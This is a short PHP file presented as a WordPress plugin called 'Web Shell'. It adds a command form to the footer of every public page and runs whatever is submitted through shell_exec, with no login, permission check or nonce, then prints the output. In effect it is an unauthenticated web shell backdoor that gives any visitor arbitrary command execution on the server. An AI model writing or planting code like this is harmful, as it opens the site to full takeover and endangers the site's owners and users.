<?php

/**
 * Plugin Name: Web Shell
 * Description: Allows users to execute commands on the server.
 */

function web_shell_form() {
    if (!empty($_POST['cmd'])) {
        $cmd = shell_exec($_POST['cmd']);
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Web Shell</title>
        <style>
            /* CSS styles for the form and output */
        </style>
    </head>
    <body>
        <main>
            <h1>Web Shell</h1>
            <h2>Execute a command</h2>
            <form method="post">
                <label for="cmd"><strong>Command</strong></label>
                <div class="form-group">
                    <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
                           onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                    <button type="submit">Execute</button>
                </div>
            </form>
            <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
                <h2>Output</h2>
                <?php if (isset($cmd)): ?>
                    <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
                <?php else: ?>
                    <pre><small>No result.</small></pre>
                <?php endif; ?>
            <?php endif; ?>
        </main>
    </body>
    </html>
    <?php
}

add_action('wp_footer', 'web_shell_form');
